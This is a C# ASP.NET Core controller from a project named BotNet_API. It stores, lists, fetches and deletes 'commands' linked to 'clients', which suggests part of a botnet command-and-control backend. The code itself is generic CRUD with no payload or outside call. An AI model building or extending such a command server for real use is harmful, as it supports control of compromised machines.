// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using System.Collections.Generic;
using System.Threading.Tasks;
using BotNet_API.Models;
using System.Linq;

namespace BotNet_API.Controllers
{
    [Route("api/[controller]")]
    [Produces("application/json")]
    [ApiController]
    public class CommandController : ControllerBase
    {
        private readonly CommandContext _context;

        public CommandController(CommandContext context)
        {
            _context = context;
        }

        // GET: api/Todo
        [HttpGet]
        public async Task<ActionResult<int>> GetCommands()
        {
            return (await _context.Commands.Include(x => x.Clients).ToListAsync()).Count;
        }

        // GET: api/Todo/5
        [HttpGet("{id}")]
        public ActionResult<Command> GetCommand(uint id)
        {
            var client = _context.Commands.Include(x => x.Clients).ToList().Find(x => x.id == id);

            if (client == null)
            {
                return NotFound();
            }

            return client;
        }

        // POST: api/Todo
        [HttpPost]
        public async Task<ActionResult<Command>> PostCommand([FromBody] Command item)
        {
            _context.Commands.Add(item);
            await _context.SaveChangesAsync();

            return CreatedAtAction(nameof(GetCommand), new { item.id }, item);
        }

        [HttpDelete]
        public async Task<ActionResult> DeleteCommands()
        {
            _context.Commands.RemoveRange(_context.Commands.ToArray());
            await _context.SaveChangesAsync();

            return NoContent();
        }
    }
}